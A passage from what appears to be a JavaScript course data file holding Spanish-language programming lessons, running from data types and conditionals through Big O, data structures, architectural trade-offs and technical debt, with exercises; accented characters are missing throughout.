Las computadoras necesitan saber qu es cada cosa para saber qu pueden hacer con ella. Los tipos ms comunes son:

### A. Nmeros (Integers y Floats)
Sirven para hacer clculos matemticos.
*   **Enteros (Integers):** Nmeros sin decimales (\`5\`, \`-10\`, \`1000\`).
*   **Decimales (Floats):** Nmeros con coma (\`3.14\`, \`19.99\`).

### B. Texto (Strings o Cadenas)
Es cualquier secuencia de caracteres: letras, smbolos, espacios o incluso nmeros que no vamos a sumar. En programacin, el texto siempre va entre **comillas**.
*   **Ejemplos:** \`"Hola Mundo"\`, \`"Juan Perez"\`, \`"Calle Falsa 123"\`, \`"555-1234"\` (este ltimo es texto porque no vas a sumar nmeros de telfono).

### C. Booleanos (Booleans)
Son los ms simples pero muy poderosos. Solo pueden tener uno de dos valores: **Verdadero (True)** o **Falso (False)**.
Es como un interruptor de luz: o est prendido o est apagado. No hay punto medio.
*   **Ejemplos:** \`esta_lloviendo = Verdadero\`, \`usuario_registrado = Falso\`.

## 2. Por qu importa el tipo?
Porque la computadora se confunde si mezclas tipos. 
*   Si sumas \`5 + 5\` (Nmeros), el resultado es \`10\`.
*   Si sumas \`"Hola " + "Juan"\` (Texto), el resultado es \`"Hola Juan"\`.
*   Qu pasara si intentas sumar \`5 + "Hola"\`? La computadora entrara en crisis porque no sabe cmo sumar un nmero con una palabra. **Por eso debemos ser ordenados.**

## 3. Ejemplos en Pseudocdigo
\`\`\`text
Variable edad = 30                 // Tipo: Nmero Entero
Variable precio = 150.50           // Tipo: Nmero Decimal
Variable mensaje = "Bienvenido"    // Tipo: Texto (String)
Variable es_premium = Verdadero    // Tipo: Booleano
\`\`\`

---

### Ejercicio Mental 6:
Qu tipo de dato usaras para guardar la siguiente informacin?
1.  La temperatura de hoy.
2.  El nombre de tu perro.
3.  Si la puerta est abierta o cerrada.
4.  Tu ao de nacimiento.
5.  Un mensaje de error.
`,completed:!1},{id:"prog-bases-07-condicionales-concepto",title:"Condicionales (La toma de decisiones)",level:"junior",content:`# Leccin 7: Condicionales (La toma de decisiones)

La programacin se trata de decidir qu hacer segn lo que pase. Para esto usamos los **Condicionales**. Es el corazn de la inteligencia de cualquier programa.

## 1. La estructura "Si... Entonces... Si no..."
Imagina que te levantas a la maana:
*   **Si** est lloviendo **Entonces** agarro el paraguas.
*   **Si no** (es decir, si no llueve) **Entonces** salgo con anteojos de sol.

En programacin es exactamente igual:
\`\`\`text
SI (condicion) ENTONCES:
    hacer algo...
SINO:
    hacer otra cosa...
FIN SI
\`\`\`

## 2. Los Operadores de Comparacin
Para que el "SI" funcione, necesitamos comparar cosas. Usamos estos smbolos matemticos simples:
*   \`==\` : Es igual a? (Usamos doble igual para diferenciarlo de asignar un valor).
*   \`!=\` : Es diferente a?
*   \`>\` : Es mayor que?
*   \`<\` : Es menor que?

## 3. Ejemplo prctico: El Portero de Boliche
Vamos a programar la lgica de un portero que no deja entrar a menores de 18 aos.

\`\`\`text
Variable edad = 17

SI (edad >= 18) ENTONCES:
    Mostrar: "Puedes pasar."
SINO:
    Mostrar: "No puedes pasar, eres menor."
FIN SI
\`\`\`

## 4. Condicionales Mltiples (SI NO SI)
A veces hay ms de dos caminos. Por ejemplo, en un examen:
*   Si sacas ms de 9: Excelente.
*   Si no, pero sacas ms de 6: Aprobado.
*   Si no: Desaprobado.

\`\`\`text
SI (nota >= 9) ENTONCES:
    Mostrar: "Excelente"
SINO SI (nota >= 6) ENTONCES:
    Mostrar: "Aprobado"
SINO:
    Mostrar: "Desaprobado"
FIN SI
\`\`\`

---

### Ejercicio Mental 7:
Imagina que ests programando un termmetro inteligente.
1. Escribe la lgica para que:
   * Si la temperatura es mayor a 30 grados, el programa diga "Prender Aire".
   * Si la temperatura es menor a 15 grados, diga "Prender Estufa".
   * En cualquier otro caso, diga "Temperatura ideal".
Intenta escribirlo siguiendo la estructura de pseudocdigo que vimos arriba.
`,completed:!1},{id:"prog-bases-08-bucles-concepto",title:"Bucles (Repeticin)",level:"junior",content:`# Leccin 8: Bucles (Repeticin)

Las computadoras son aburridas, y eso es genial. A diferencia de un humano, una computadora puede repetir la misma tarea mil millones de veces sin cansarse, sin quejarse y sin cometer errores por aburrimiento. 

**Un Bucle (o Loop) es una instruccin que le dice al programa que repita algo.**

## 1. El Bucle "MIENTRAS" (While)
Este bucle repite algo **mientras una condicin sea verdadera**.
Analoga: "Lava los platos **mientras** haya platos sucios en la pileta".

\`\`\`text
MIENTRAS (quedan platos) HACER:
    Lavar un plato
FIN MIENTRAS
\`\`\`

**Cuidado!** Si la condicin nunca se vuelve falsa, el programa se quedar repitiendo para siempre. A esto lo llamamos **Bucle Infinito** y es un error comn que hace que tu computadora se trabe (se "tilda").

## 2. El Bucle "PARA" (For)
Este bucle se usa cuando sabemos **exactamente cuntas veces** queremos repetir algo.
Analoga: "Da 5 vueltas a la manzana".

\`\`\`text
PARA (vuelta desde 1 hasta 5) HACER:
    Caminar una cuadra
    Doblar en la esquina
FIN PARA
\`\`\`

## 3. Ejemplo prctico: Subir una escalera
Imagina que un robot debe subir 10 escalones.

**Sin bucles:**
1. Sube un escaln.
2. Sube un escaln.
(As 10 veces... Qu aburrido de escribir!).

**Con bucles:**
\`\`\`text
PARA (paso desde 1 hasta 10) HACER:
    Subir un escaln
FIN PARA
\`\`\`

## 4. Para qu sirven en el mundo real?
*   Enviar el mismo correo a 500 personas.
*   Mostrar todos los productos de un catlogo.
*   Reproducir una cancin en bucle (cuando termina, el bucle dice "mientras el botn repeat est activado, empieza de nuevo").

---

### Ejercicio Mental 8:
Disea la lgica para un contador bomba que empiece en 10 y baje hasta 0. Cuando llegue a 0, debe mostrar el mensaje "BOOM!".
Qu tipo de bucle usaras? Qu pasara adentro del bucle con la variable del tiempo?
(Pista: En cada repeticin, el tiempo debera ser \`tiempo - 1\`).
`,completed:!1},{id:"prog-bases-09-funciones-concepto",title:"Funciones (Agrupar lgica)",level:"junior",content:`# Leccin 9: Funciones (Agrupar lgica)

A medida que los programas crecen, se vuelven difciles de leer. Si tenemos que hacer la misma tarea compleja en cinco lugares distintos, no queremos copiar y pegar el mismo cdigo. 

**Una funcin es un bloque de cdigo al que le damos un nombre para poder "llamarla" cuando queramos.**

## 1. La analoga de la Licuadora
Imagina una licuadora. Es una **Funcin**.
*   **Entrada:** Le pones fruta y leche.
*   **Proceso:** Licuar (romper todo y mezclar).
*   **Salida:** Te devuelve un licuado rico.

Lo mejor es que no necesitas saber cmo funciona el motor por dentro cada vez que quieres un licuado; solo presionas el botn "Licuar" y listo.

## 2. Definir vs Llamar
Para usar una funcin hay dos pasos:
1. **Definirla:** Le dices al programa qu tiene que hacer la funcin.
2. **Llamarla:** La usas efectivamente en el cdigo.

\`\`\`text
// 1. DEFINIR la funcin
FUNCION HacerBatido(fruta):
    Poner fruta en jarra
    Encender motor
    Servir en vaso
FIN FUNCION

// 2. LLAMAR a la funcin
HacerBatido("Banana")
HacerBatido("Fresa")
\`\`\`

## 3. Parmetros y Retorno
*   **Parmetros:** Son la informacin que le pasas a la funcin para que trabaje (en el ejemplo anterior era la \`fruta\`).
*   **Retorno (Return):** Es el resultado que la funcin te devuelve.

Ejemplo matemtico:
\`\`\`text
FUNCION Sumar(num1, num2):
    Variable resultado = num1 + num2
    RETORNAR resultado
FIN FUNCION

Variable mi_suma = Sumar(5, 10) // mi_suma ahora vale 15
\`\`\`

## 4. Por qu esto es increble?
*   **Orden:** Tu programa principal se ve ms limpio.
*   **Mantenimiento:** Si hay un error en cmo se hace el batido, lo arreglas una sola vez en la definicin de la funcin, y se arregla automticamente en todos los lugares donde lo usaste.

---

### Ejercicio Mental 9:
Imagina que ests programando un videojuego. Describe una funcin llamada \`Atacar\`. 
1. Qu **parmetros** recibira? (El nombre del arma? La fuerza?). 
2. Nombra 3 pasos lgicos que ocurriran dentro de la funcin.
3. Al final, qu **retornara** la funcin? (El dao causado? Si el enemigo muri?).
`,completed:!1},{id:"prog-bases-10-errores-depuracion",title:"Errores y Depuracin Bsica",level:"junior",content:`# Leccin 10: Errores y Depuracin Bsica

En programacin, las cosas casi nunca funcionan a la primera. No es porque seas malo, es simplemente la naturaleza de este trabajo. Incluso los mejores programadores del mundo pasan el 50% de su tiempo buscando errores.

## 1. Qu es un "Bug"?
Llamamos **Bug** (bicho) a cualquier error en el programa que hace que no funcione como esperamos. 
La leyenda dice que la palabra viene de una polilla real que se meti en una computadora antigua y quem un cable.

## 2. Tipos de errores
*   **Error de Sintaxis:** Es como un error de ortografa. Escribiste mal un comando y la computadora no entiende qu quieres. Ejemplo: escribir \`S \` en lugar de \`SI\`.
*   **Error de Lgica:** El programa "funciona" (la computadora entiende todo), pero el resultado est mal. Ejemplo: Quieres sumar y el programa resta. Es un error en tu algoritmo, no en la mquina.

## 3. Qu es la Depuracin (Debugging)?
Es el proceso de encontrar y matar al bug. Es como jugar a ser detective.

**Pasos para depurar como un pro:**
1.  **Gritarle a la computadora no sirve.** Mantn la calma.
2.  **Lee el mensaje de error:** La computadora suele decirte en qu lnea ocurri el problema.
3.  **Vuelve a leer tu cdigo:** Lee paso a paso como si fueras la computadora. Qu valor tiene cada variable en este momento?
4.  **Prueba por partes:** Si una funcin falla, prueba sus partes por separado para ver cul es la que se rompi.

## 4. El "Debugger de Pato de Goma"
Existe una tcnica real llamada *Rubber Duck Debugging*. Consiste en poner un patito de goma (o cualquier objeto) sobre tu mesa y explicarle tu cdigo lnea por lnea.
Cuando intentas explicarle a otro qu hace tu cdigo, tu cerebro a menudo se da cuenta solo del error: *"Ah, espera... aqu estoy sumando peras con manzanas"*.

---

### Ejercicio Mental 10:
Imagina este cdigo de pseudocdigo:
\`\`\`text
Variable saldo = 100
Variable gasto = 150

SI (saldo < gasto) ENTONCES:
    Mostrar: "Compra realizada con xito"
SINO:
    Mostrar: "Saldo insuficiente"
FIN SI
\`\`\`
Ves el error? Si tengo 100 de saldo y gasto 150, qu mensaje me va a mostrar el programa? Cmo cambiaras la condicin del \`SI\` para que sea lgica?
`,completed:!1},{id:"prog-bases-11-buenas-practicas",title:"Buenas Prcticas Mentales",level:"junior",content:`# Leccin 11: Buenas Prcticas Mentales

Programar bien no es una cuestin de astucia, sino de hbitos. Como esta es la ltima leccin de las bases, vamos a ver qu separa a un buen programador de uno mediocre.

## 1. El cdigo se lee ms de lo que se escribe
Pasars mucho tiempo leyendo cdigo que escribiste hace meses o cdigo escrito por otros. 
*   **S claro:** Usa nombres de variables que expliquen qu hacen.
*   **Comenta tu cdigo:** Deja pequeas notas para tu "yo del futuro". 

\`\`\`text
// Este bloque calcula el descuento del 10% para jubilados
Variable descuento = total * 0.10
\`\`\`

## 2. El principio KISS (Keep It Simple, Stupid)
En programacin, lo ms complejo no es lo mejor. **Lo ms simple es lo mejor.** 
Si puedes resolver un problema en 3 pasos, no uses 10. El cdigo simple es ms fcil de arreglar y de entender.

## 3. No le tengas miedo a fallar
En esta carrera, vers errores todos los das. Un error no significa que "no sirves para esto", significa que ests aprendiendo algo nuevo. Cada vez que arreglas un bug, tu cerebro gana una herramienta nueva.

## 4. Documenta tu pensamiento
Antes de escribir una sola lnea de cdigo real, haz un boceto en papel o en pseudocdigo. Entender la lgica primero te ahorrar horas de sudor frente al teclado.

## 5. El aprendizaje nunca termina
La tecnologa cambia rpido. Pero las bases que aprendiste en este mdulo (algoritmos, lgica, variables, condicionales) **son universales**. No importa si maana sale el lenguaje "SuperJS 5000", las bases seguirn siendo las mismas.

---

### Tu primer gran paso
Felicitaciones! Has completado el mdulo de Bases de la Programacin. Aunque no hemos escrito cdigo "de verdad" todava, ya tienes lo ms importante: **la mentalidad de programador**.

Ahora ests listo para enfrentar desafos prcticos y empezar a hablarle a las mquinas. A romperla! 
`,completed:!1,isProject:!0},{id:"prog-bases-12-practica-logica-junior",title:"Lgica de Programacin Junior",level:"junior",content:`# Prctica: Lgica de Programacin Junior

Esta gua de ejercicios te ayudar a fortalecer tu msculo lgico. Recuerda: No estamos escribiendo cdigo para una mquina todava, estamos escribiendo instrucciones para que cualquier humano pueda seguirlas sin perderse.

---

## 1. Algoritmos de la Vida Cotidiana
Un algoritmo debe ser a prueba de fallos. Intenta describir los pasos para estas situaciones, considerando los posibles obstculos:

### Caso A: El Mate / T Perfecto
**Contexto:** Debes explicarle a un extraterrestre cmo preparar tu infusin favorita.
**Consigna:**
*   Nombra todos los elementos necesarios (Entradas).
*   Escribe al menos 10 pasos ordenados.
*   Incluye qu hacer si el agua est demasiado fra (Condicional).

### Caso B: Compras Online
**Contexto:** Ests diseando los pasos para comprar una remera en una web.
**Consigna:**
*   Escribe el flujo desde que el usuario ve la remera hasta que recibe el mensaje de "Compra Exitosa".
*   Qu pasa si no hay stock del talle elegido?

---

## 2. Diagramas de Flujo (Lgica Visual)
Aunque no los dibujemos, los diagramas de flujo representan los caminos que toma un programa. Describe el flujo lgico para estos sistemas inteligentes:

### El Sensor de Luz de un Jardn
**Consigna:** Describe qu camino sigue el programa considerando los siguientes elementos:
1.  **Inicio**
2.  **Entrada:** Nivel de luz solar (0 a 100).
3.  **Decisin:** El nivel de luz es menor a 20?
4.  **Accin A:** Prender luces.
5.  **Accin B:** Apagar luces.
6.  **Espera:** Esperar 10 minutos y volver a empezar.

---

## 3. Resolucin de Problemas Lgicos
Pon a prueba tu pensamiento lateral y tu capacidad de anlisis:

### El Desafo del Ascensor
**Contexto:** Un edificio tiene 10 pisos. El ascensor est en el piso 1. Dos personas llaman al mismo tiempo: una desde el piso 5 (quiere bajar) y otra desde el piso 9 (quiere bajar).
**Consigna:**
*   A quin debera buscar primero el ascensor para ser ms eficiente? Justifica tu respuesta paso a paso.
*   Si el ascensor solo puede llevar a una persona, cmo cambia tu algoritmo?

### Las Tres Lmparas
**Contexto:** Tienes una habitacin cerrada con 3 lmparas adentro. Afuera hay 3 interruptores. Solo puedes entrar a la habitacin UNA VEZ.
**Consigna:** Cmo puedes saber qu interruptor corresponde a qu lmpara? (Pista: Piensa en otra salida adems de la luz, como el calor). Describe tu proceso lgico paso a paso.

---

## 4. Pensamiento Estructurado (Entrada -> Proceso -> Salida)
Completa el siguiente cuadro lgico para estos sistemas:

| Sistema | Entradas | Proceso (Lgica simple) | Salida |
| :--- | :--- | :--- | :--- |
| **Lavarropas** | Ropa sucia, Jabn, Programa | SI Algodn -> Lavar 40 min... | Ropa Limpia |
| **Cajero Automtico** | ? | ? | ? |
| **Buscador de Google** | ? | ? | ? |
| **Alarma de Celular** | ? | ? | ? |

---

## 5. El Desafo del Robot "Bartender"
**Contexto:** Un robot debe servir jugo de naranja.
**Pseudocdigo a completar:**
\`\`\`text
1. Agarrar un vaso.
2. SI (vaso tiene suciedad) ENTONCES:
      _________________________
   SINO:
      _________________________
3. MIENTRAS (vaso no est lleno al 90%) HACER:
      _________________________
4. Mostrar: "Jugo listo, que lo disfrutes".
\`\`\`
**Consigna:** Completa los espacios en blanco para que el robot funcione correctamente y no ensucie la cocina.

---

Felicitaciones! Si completaste estos ejercicios, ests pensando como un verdadero arquitecto de soluciones. La sintaxis de los lenguajes de programacin es solo el envoltorio; esto que acabas de practicar es el verdadero regalo.      
`,completed:!1,isProject:!0},{id:"prog-bases-13-pensamiento-algoritmico",title:"Pensamiento Algortmico y Complejidad Bsica",level:"semi-senior",content:`# Leccin 13: Pensamiento Algortmico y Complejidad Bsica

Como programador Semi-Senior, ya sabes que "hacer que funcione" es solo el primer paso. El verdadero desafo es **hacer que funcione de manera ptima**.

## 1. Ms all del cdigo: El Pensamiento Algortmico
El pensamiento algortmico es la capacidad de definir procesos que no solo resuelven un problema, sino que lo hacen considerando los recursos disponibles (tiempo y memoria).

### Ejemplo: Buscar un nombre en una agenda fsica
1.  **Enfoque Lineal:** Empiezas en la pgina 1 y pasas hoja por hoja hasta encontrarlo. Si la agenda tiene 1000 hojas, podras tardar 1000 pasos.
2.  **Enfoque Binario:** Abres la agenda a la mitad. El nombre est antes o despus? Descartas 500 hojas de un golpe. Repites. En 10 pasos habrs encontrado el nombre entre 1000.

## 2. Introduccin a la Complejidad (Big O)
No necesitas ser un experto en matemticas, pero s entender el concepto de **Orden de Crecimiento**.

*   **O(1) - Tiempo Constante:** No importa si tienes 1 dato o 1 milln, tarda lo mismo (ej: acceder a un dato por su ID).
*   **O(n) - Tiempo Lineal:** Si los datos se duplican, el tiempo de ejecucin se duplica (ej: un bucle simple).
*   **O(n) - Tiempo Cuadrtico:** Si los datos se duplican, el tiempo se cuadriplica (ej: bucles anidados). **Peligro en produccin!**

## 3. Resolucin de Problemas: La Estrategia del Semi-Senior
Cuando te dan un problema complejo, un Junior empieza a escribir cdigo inmediatamente. Un Semi-Senior:
1.  **Analiza los lmites:** Cuntos datos vamos a procesar? 100 o 10 millones?
2.  **Busca el cuello de botella:** Qu parte del algoritmo es la ms lenta?
3.  **Evala Trade-offs:** Prefiero que el programa sea ms rpido aunque gaste ms memoria?

---

### Ejercicio de Razonamiento 13:
Tienes una lista de 10.000 nmeros desordenados y necesitas saber si hay duplicados.
*   **Plan A:** Comparar cada nmero con todos los dems usando dos bucles anidados.
*   **Plan B:** Ordenar primero la lista y luego comparar cada nmero solo con el siguiente.
*   **Plan C:** Usar una estructura que no permita duplicados (como un Set) y ver si el tamao final cambia.

Cul es el ms eficiente y por qu? Justifica tu respuesta pensando en el impacto si la lista creciera a 1.000.000 de nmeros.
`,completed:!1},{id:"prog-bases-14-abstraccion-descomposicion",title:"Abstraccin y Descomposicin de Problemas Reales",level:"semi-senior",content:`# Leccin 14: Abstraccin y Descomposicin de Problemas Reales

A este nivel, los problemas dejan de ser "suma estos nmeros" para convertirse en "disea un sistema de facturacin". La clave para no morir en el intento son la **Abstraccin** y la **Descomposicin**.

## 1. Abstraccin Avanzada
Abstraer no es solo omitir detalles; es crear **modelos mentales** que representen la esencia de un problema.

**Caso de estudio: Sistema de Logstica**
Si ests programando el seguimiento de paquetes:
*   **Detalles irrelevantes:** El color del camin, el nombre del conductor del da, el clima (generalmente).
*   **Abstraccin necesaria:** Estado del paquete (\`En camino\`, \`Entregado\`), Coordenadas de origen/destino, Tiempo estimado.

## 2. Descomposicin: El Arte de Desarmar
Un problema complejo es solo una montaa de problemas pequeos. El secreto es separarlos de forma que sean independientes (Bajo Acoplamiento).

### Metodologa:
1.  **Identificar el Flujo Principal:** Cul es el camino feliz?
2.  **Identificar los Casos de Error:** Qu puede fallar en cada paso?
3.  **Encapsular:** Crear pequeas funciones o mdulos que resuelvan una sola sub-tarea.

## 3. Resolucin de un Problema Real: El "Checkout" de E-commerce
No pienses en cdigo, piensa en procesos:
*   **Sub-problema 1:** Validar stock de cada item.
*   **Sub-problema 2:** Calcular impuestos segn la regin.
*   **Sub-problema 3:** Aplicar cupones de descuento.
*   **Sub-problema 4:** Integrar con la pasarela de pagos.

Si intentas programar todo esto en un solo bloque, crears un "cdigo espagueti" imposible de mantener.

---

### Ejercicio de Razonamiento 14:
Imagina que te piden crear un sistema para una **Biblioteca Municipal**. 
1.  **Aplica Abstraccin:** Qu 5 datos son vitales para el objeto \`Libro\`?
2.  **Aplica Descomposicin:** Una persona quiere devolver un libro que entreg con retraso. Enumera los 4 pasos (sub-problemas) que el sistema debe ejecutar.
3.  **Compara enfoques:** Es mejor tener una sola gran funcin \`procesar_todo()\` o sub-funciones como \`calcular_multa()\` y \`actualizar_stock()\`? Por qu?
`,completed:!1},{id:"prog-bases-15-patrones-estructuras",title:"Patrones Mentales y Estructuras de Datos",level:"semi-senior",content:`# Leccin 15: Patrones Mentales y Estructuras de Datos

Tu cerebro debe empezar a reconocer estructuras de datos no como "teora", sino como herramientas especficas para problemas recurrentes.

## 1. Patrones Mentales: El "Cmo lo guardo?"
Cada vez que recibes datos, tu primera pregunta debe ser: **Cmo voy a acceder a esta informacin despus?**

*   **Si necesito orden y acceso por posicin:** Uso un **Array** (Lista).
*   **Si necesito buscar algo por una clave nica rpidamente:** Uso un **Mapa** (Diccionario/Objeto).
*   **Si necesito asegurar que no haya repetidos:** Uso un **Set** (Conjunto).
*   **Si necesito procesar cosas en orden de llegada:** Uso una **Cola** (Queue - FIFO).
*   **Si necesito deshacer la ltima accin:** Uso una **Pila** (Stack - LIFO).

## 2. Estructuras de Datos en Accin
Mira cmo el cambio de estructura cambia la lgica:

### Problema: Sistema de Notificaciones de una App
*   **Opcin A (Array):** Guardas las notificaciones en una lista. Para borrar la ms vieja, tienes que mover todos los elementos de lugar. Lento.
*   **Opcin B (Cola):** La estructura est diseada para que el primero que entra sea el primero que sale. Eficiente y coherente.

## 3. El hbito del Semi-Senior: Evitar la "Fuerza Bruta"
La fuerza bruta es usar un bucle dentro de otro para buscar coincidencias. 
**Truco de Oro:** Muchas veces, puedes cambiar un algoritmo O(n) por uno O(n) simplemente usando un **Mapa** temporal para recordar lo que ya viste.

---

### Ejercicio de Razonamiento 15:
Ests programando el botn "Atrs" de un navegador web. El usuario visita:
\`Google -> Facebook -> Instagram -> Wikipedia\`.
1.  Qu estructura de datos (Pila o Cola) usaras para guardar este historial de forma que el botn "Atrs" funcione correctamente?
2.  Dibuja el estado de esa estructura en cada paso.
3.  Qu pasara si usaras la estructura incorrecta? Describe el error que vera el usuario.
`,completed:!1},{id:"prog-bases-16-pensamiento-sistemico",title:"Anlisis de Problemas Complejos y Pensamiento Sistmico",level:"senior",content:`# Leccin 16: Anlisis de Problemas Complejos y Pensamiento Sistmico

En el nivel Senior, ya no resolvemos "tickets"; resolvemos **problemas de negocio** mediante sistemas tcnicos. La diferencia radica en entender que el software no vive en el vaco, sino en un ecosistema interconectado.

## 1. El Pensamiento Sistmico
Un sistema es ms que la suma de sus partes. El pensamiento sistmico nos obliga a ver:
*   **Interdependencias:** Cmo afecta mi cambio en el mdulo A a la latitud del mdulo C?
*   **Bucles de Retroalimentacin:** Cmo reaccionar el sistema bajo carga si introduzco este nuevo algoritmo?
*   **Resultados Emergentes:** Comportamientos que no estaban en los componentes individuales pero aparecen al unirlos.

## 2. Anlisis de Problemas mediante "Primeros Principios"
Un Arquitecto no acepta "siempre se hizo as". Usamos el mtodo de Primeros Principios:
1.  **Desglosar** el problema hasta sus verdades fundamentales.
2.  **Reconstruir** la solucin desde cero sin prejuicios tecnolgicos.

**Caso Real: El Sistema de Notificaciones que "tilda" la App**
*   *Problema superficial:* La base de datos est lenta.
*   *Anlisis sistmico:* El sistema de notificaciones enva 1 milln de push al mismo tiempo. Todos los usuarios abren la app simultneamente. El pico de trfico satura la DB. 
*   *Solucin Senior:* No escalamos la DB; implementamos un **Staggered Push** (envo escalonado) o un sistema de colas con **Load Leveling**.

## 3. Identificacin de la "Causa Raz" (5 Whys)
No tratamos sntomas, tratamos enfermedades. Preguntamos "Por qu" hasta llegar al problema de diseo fundamental.

---

### Desafo de Pensamiento Senior 16:
Ests diseando el sistema de inventario para una cadena global de tiendas. 
*   **Dato:** La sincronizacin de stock es crtica, pero la conexin a internet en algunas tiendas es inestable.
*   **Problema:** Si usas una base de datos central, las tiendas sin internet no pueden vender. Si usas bases locales, el stock global est desactualizado.
*   **Misin:** Aplica el pensamiento sistmico. Cmo balancearas la **Consistencia** (stock exacto) vs la **Disponibilidad** (poder vender siempre)? Qu pasa si dos tiendas venden el ltimo producto al mismo tiempo?
`,completed:!1},{id:"prog-bases-17-diseno-algoritmos-avanzados",title:"Diseo de Algoritmos y Optimizacin Mental",level:"senior",content:`# Leccin 17: Diseo de Algoritmos y Optimizacin Mental

A este nivel, la optimizacin no es solo "hacerlo rpido", sino entender los lmites fsicos y lgicos de la solucin elegida.

## 1. Diseo de Algoritmos a Escala
Un algoritmo que funciona para 1,000 usuarios puede ser catastrfico para 100,000,000. El Arquitecto Senior disea con la **escalabilidad horizontal** en mente.

*   **Statelessness (Sin estado):** El algoritmo no debe depender de memoria local voltil si queremos que corra en mltiples servidores.
*   **Idempotencia:** Si el algoritmo se ejecuta dos veces por error, el resultado debe ser el mismo (vital en sistemas distribuidos).

## 2. Optimizacin Mental y Estructuras de Datos Especializadas
Ms all de Arrays y Mapas, un Senior conoce:
*   **Bloom Filters:** Para saber si un elemento existe en un set gigante con gasto mnimo de memoria.
*   **HyperLogLog:** Para contar elementos nicos en flujos de datos masivos.
*   **Geohashes:** Para bsquedas espaciales eficientes.

## 3. El Costo de la Abstraccin
Cada capa de abstraccin (frameworks, ORMs, libreras) tiene un costo de performance. El Senior sabe cundo "bajar de nivel" para optimizar un cuello de botella crtico, sin sacrificar la legibilidad del resto del sistema.

---

### Desafo de Pensamiento Senior 17:
Debes procesar un archivo de 50GB de logs buscando patrones de error, pero el servidor solo tiene 8GB de RAM.
1.  **Algoritmo Ineficiente:** Cargar todo el archivo en memoria y filtrar. (Crash inmediato).
2.  **Estrategia Senior:** Cmo dividiras el problema? (Pista: Streaming vs Buffering).
3.  **Optimizacin:** Si necesitas saber cuntos usuarios  NICOS tuvieron errores sin guardar todos sus IDs, qu estructura de datos mencionada arriba usaras para ahorrar el 99% de la RAM?
`,completed:!1},{id:"prog-bases-18-tradeoffs-decisiones",title:"Trade-offs y Toma de Decisiones Arquitectnicas",level:"senior",content:`# Leccin 18: Trade-offs y Toma de Decisiones Arquitectnicas

En ingeniera de software **no hay soluciones perfectas, solo hay compromisos (trade-offs)**. Ser Senior es saber qu ests sacrificando en cada decisin.

## 1. El Marco de Decisin: Tiempo, Calidad, Costo
Toda decisin tcnica impacta en estas tres variables. 
*   Si eliges una tecnologa de vanguardia, ganas **Velocidad de desarrollo**, pero sacrificas **Estabilidad** y **Mantenimiento** a largo plazo (deuda tcnica).

## 2. Flexibilidad vs Rendimiento
Sistemas extremadamente flexibles suelen ser ms lentos debido a las capas de indireccin. Sistemas extremadamente optimizados suelen ser rgidos y difciles de cambiar.
*   **Senior Tip:** Optimiza prematuramente y te arrepentirs. Disea para el cambio, pero identifica el 20% del cdigo que maneja el 80% del trfico y optimiza *solo eso* agresivamente.

## 3. Comprar vs Construir (Build vs Buy)
Debemos programar nuestro propio sistema de auth o usar Auth0?
*   **Build:** Control total, sin costos recurrentes, pero requiere tiempo y mantenimiento eterno.
*   **Buy:** Rpido, seguro, pero genera dependencia del proveedor (Vendor Lock-in) y costos de escala.

---

### Desafo de Pensamiento Senior 18:
Tu startup est creciendo. El sistema monoltico actual es fcil de desplegar pero difcil de escalar para el equipo de 50 programadores.
1.  **Opcin A:** Migrar a Microservicios. (Alta complejidad, latitud de red, necesidad de DevOps).
2.  **Opcin B:** Modularizar el Monolito (Monolito Modular). (Ms simple, pero sigue compartiendo la misma base de datos, lo que puede ser un cuello de botella).

Qu criterios usaras para decidir? Nombra 3 factores de negocio que te haran elegir la Opcin A sobre la B.
`,completed:!1},{id:"prog-bases-19-errores-diseno-deuda",title:"Errores de Diseo y Deuda Tcnica",level:"senior",content:`# Leccin 19: Errores de Diseo y Deuda Tcnica

El cdigo que escribimos hoy es el legado que mantendremos maana. Un Senior entiende que la deuda tcnica es una herramienta financiera: a veces es til para salir rpido, pero si no se paga, los intereses matan el proyecto.

## 1. Patrones vs Antipatrones
Un antipatrn es una solucin que parece buena pero tiene consecuencias desastrosas:
*   **The God Object:** Una sola clase/funcin que lo sabe y hace todo. Violacin total del principio de Responsabilidad  nica.
*   **Big Ball of Mud:** Falta total de arquitectura, donde el cdigo est entrelazado de forma impredecible.
*   **Golden Hammer:** Usar la misma tecnologa para todo (ej: usar una base de datos de grafos para guardar una simple lista de tareas).

## 2. Cmo manejar la Deuda Tcnica
*   **Visibilidad:** Mapear los puntos del sistema que son "dolorosos" de modificar.
*   **Refactorizacin Continua:** El Boy Scout Rule (deja el cdigo un poco mejor de como lo encontraste).
*   **Estrategia de Estrangulamiento (Strangler Pattern):** Para sistemas legacy, ir reemplazando piezas poco a poco en lugar de intentar un "re-write" total que suele fallar.

## 3. El sesgo de la "Solucin Elegante"
A veces los Seniors nos perdemos en abstracciones excesivamente complejas para problemas simples. 
**Regla Senior:** La elegancia real de un diseo se mide por lo fcil que es para un Junior entenderlo sin supervisin.

---

### Desafo de Pensamiento Senior 19:
Heredas un proyecto donde cambiar el color de un botn requiere tocar 5 archivos diferentes y rezar para que no se rompa el reporte de ventas.
1.  Identifica qu tipo de problema arquitectnico es este (Acoplamiento? Falta de abstraccin?).
2.  Propn un plan de 3 fases para arreglarlo sin detener las nuevas funcionalidades que pide el negocio.
3.  Cmo convenceras al Product Manager de que invertir tiempo en este "mantenimiento invisible" es mejor que sacar 2 features nuevas?
`,completed:!1},{id:"prog-bases-20-evaluacion-liderazgo",title:"Evaluacin de Soluciones y Roadmap Tecnolgico",level:"senior",content:`# Leccin 20: Evaluacin de Soluciones y Roadmap Tecnolgico

La ltima etapa del pensamiento de un Arquitecto es la capacidad de mirar al futuro y evaluar si la tecnologa que elegimos hoy seguir siendo vlida en 3 aos.

## 1. Benchmarking y POCs (Pruebas de Concepto)
No elegimos tecnologas por "hype". Hacemos pruebas reales:
*   **Latencia:** Cunto tarda realmente en procesar bajo stress?
*   **Curva de aprendizaje:** Cunto tardar el equipo en ser productivo?
*   **Comunidad y Soporte:** Morir esta librera en 6 meses?

## 2. El Ciclo de Vida del Software
Un Senior sabe que el software tiene etapas:
1.  **Exploracin (MVP):** Primamos velocidad.
2.  **Crecimiento:** Primamos estabilidad y escalabilidad.
3.  **Madurez:** Primamos mantenimiento y costo operativo.

## 3. Liderazgo Tcnico
Ser Senior implica mentora. Tu objetivo final es que el sistema sea capaz de sobrevivir sin ti. El cdigo debe estar documentado no solo en el "qu" hace, sino en el **"por qu"** de las decisiones tomadas (ADRs - Architecture Decision Records).

---

### Desafo Final Senior 20:
Has llegado al final de las bases. Tu ltima tarea no es programar, es **evaluar**.
Ests frente a dos propuestas para una nueva API:
